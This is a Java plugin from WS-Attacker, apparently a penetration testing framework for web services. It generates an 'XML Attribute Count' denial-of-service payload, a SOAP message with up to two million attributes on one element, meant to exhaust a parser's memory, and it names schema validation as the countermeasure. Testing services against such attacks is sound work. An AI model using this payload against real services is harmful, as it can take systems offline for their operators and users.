/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;

import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;

import java.util.HashMap;
import java.util.Map;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;

public class XmlAttributeCount
    extends AbstractDosPlugin
{

    // Mandatory DOS-specific Attributes - Do NOT change!
    private static final long serialVersionUID = 1L;

    // Custom Attributes
    private AbstractOptionInteger optionNumberAttributes;

    @Override
    public void initializeDosPlugin()
    {
        initData();
        // Custom Initilisation
        optionNumberAttributes =
            new OptionLimitedInteger( "Number of attributes", 25000, "The number of attributes placed in the message.",
                                      1, 2000000 );
        getPluginOptions().add( optionNumberAttributes );
    }

    @Override
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition()
    {
        return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENTATTRIBUTES;
    }

    public AbstractOptionInteger getOptionNumberAttributes()
    {
        return optionNumberAttributes;
    }

    public void initData()
    {
        setName( "XML Attribute Count Attack" );
        setDescription( "<html><p>This attack checks wheter or not a Web service is vulnerable to the \"XML Attribute Count Attack\"</p>"
            + "<p>A vulnerable server will run out of memory when parsing an XML document "
            + "with a high attribute count for a single element</p>"
            + "<p>The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below "
            + "with the defined number of unique attributes.</p>"
            + "<p>The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message.</p></html>" );
        setCountermeasures( "In order to counter the attack limit the number of attributes of an element.\n This can be achived using XML schema validation." );
    }

    @Override
    public void createTamperedRequest()
    {

        // create payload string for selected hash algorithms
        StringBuilder sb = new StringBuilder();
        sb.append( "" );

        // create attribute string
        for ( int i = 0; i < optionNumberAttributes.getValue(); i++ )
        {
            // TODO [CHAL 2014-01-10] "a" should be paramized or a constant
            sb.append( " a" + i + "=\"" + i + "\"" );
        }

        // replace "Payload-Attribute" with Payload-String
        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
        String soapMessageFinal =
            this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload( soapMessage, sb.toString() );

        // get HeaderFields from original request, if required add custom
        // headers - make sure to clone!
        Map<String, String> httpHeaderMap = new HashMap<String, String>();
        for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
        {
            httpHeaderMap.put( entry.getKey(), entry.getValue() );
        }

        // write payload and header to TamperedRequestObject
        this.setTamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal );
    }
    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below!
    // ----------------------------------------------------------
}
